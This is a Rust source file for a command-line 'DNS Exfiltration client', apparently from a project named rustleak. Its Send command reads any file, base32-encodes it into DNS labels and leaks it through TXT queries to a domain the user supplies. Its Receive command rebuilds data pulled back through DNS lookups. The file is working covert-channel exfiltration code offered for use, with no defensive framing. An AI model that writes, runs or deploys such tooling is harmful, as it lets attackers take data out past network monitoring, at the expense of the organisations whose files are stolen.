use clap::{Parser, Subcommand};
use hickory_resolver::proto::rr::record_data;
use std::fs;
use log::{error, info};
use simple_logger::SimpleLogger;
use rustleak_lib::{
    dns::*,
    utils::{decode_base32, encode_base32, split_data_into_label_chunks},
};
use std::time::Instant;

const MAX_ATTEMPTS: usize = 10;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Send data
    Send {
        #[arg(short, long)]
        code: String,

        #[arg(short, long)]
        filename: String,

        #[arg(short, long)]
        domain: String,
    },
    /// Receive data
    Receive {
        #[arg(short, long)]
        code: String,

        #[arg(short, long)]
        filename: String,

        #[arg(short, long)]
        domain: String,
    },
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    let args = Args::parse();
    let resolver = get_resolver();

    info!("Starting DNS Exfiltration client");

    match args.command {
        Commands::Send { code, filename, domain } => {
            match fs::read(&filename) {
                Ok(raw_bytes) => {
                    info!("File {} exists and is readable", &filename);
                    let labels = split_data_into_label_chunks(&raw_bytes);
                    let encoded_labels = encode_base32(labels);
                    let total_labels = encoded_labels.len();
            
                    let start_time = Instant::now();
                    for (i, label) in encoded_labels.iter().enumerate() {
                        let mut attempts = 0;
                        loop {
                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                            let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
            
                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await {
                                Ok(_) => break,
                                Err(_) => {
                                    attempts += 1;
                                    if attempts >= MAX_ATTEMPTS {
                                        error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
                                        break;
                                    }
                                }
                            }
                        }
            
                        let progress = (i + 1) as f32 / total_labels as f32 * 100.0;
                        let elapsed = start_time.elapsed().as_secs_f32();
                        let estimated_total = elapsed / ((i + 1) as f32 / total_labels as f32);
                        let remaining = estimated_total - elapsed;
                        info!(
                            "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
                            progress, elapsed, remaining
                        );
                    }
                    info!("Data sent successfully!");
                }
                Err(e) => {
                    error!("Error reading file: {}", e);
                    return;
                }
            };
        }
        Commands::Receive { code, filename, domain } => {
            match fs::OpenOptions::new().write(true).create(true).open(&filename) {
                Ok(_) => info!("File {} is writable", &filename),
                Err(e) => {
                    error!("Error opening file for writing: {}", e);
                    return;
                }
            };

            let query = format!("DOWNLOAD.{}.{}", code, domain);
            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;

            let total_fragments: usize = match response {
                Ok(lookup) => {
                    let records = lookup.iter().collect::<Vec<_>>();
                    let record_data = records[0].to_string();
                    record_data.parse::<usize>().unwrap_or_else(|_| {
                        error!("Invalid fragment count response: {}", record_data);
                        std::process::exit(1);
                    })
                }
                Err(_) => {
                    error!("Failed to retrieve fragment count.");
                    return;
                }
            };

            info!("Total fragments to download: {}", total_fragments);

            let start_time = Instant::now();
            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
            for seq in 0..total_fragments {
                let mut attempts = 0;
                while attempts < MAX_ATTEMPTS {
                    let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
                        Ok(lookup) => {
                            let records = lookup.iter().collect::<Vec<_>>();
                            let record_data = records[0].to_string();
                            received_data[seq] = Some(record_data);
                            break;
                        }
                        Err(_) => {
                            attempts += 1;
                        }
                    }
                }

                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
                let elapsed = start_time.elapsed().as_secs_f32();
                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
                let remaining = estimated_total - elapsed;
                info!(
                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
                    progress, elapsed, remaining
                );
            }

            let decoded_data = decode_base32(
                received_data.into_iter().filter_map(|fragment| fragment).collect(),
            );
            let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
            fs::write(&filename, flattened_data).expect("Failed to write data to file");
            info!("Data successfully written to file: {}", filename);
        }
    }
}
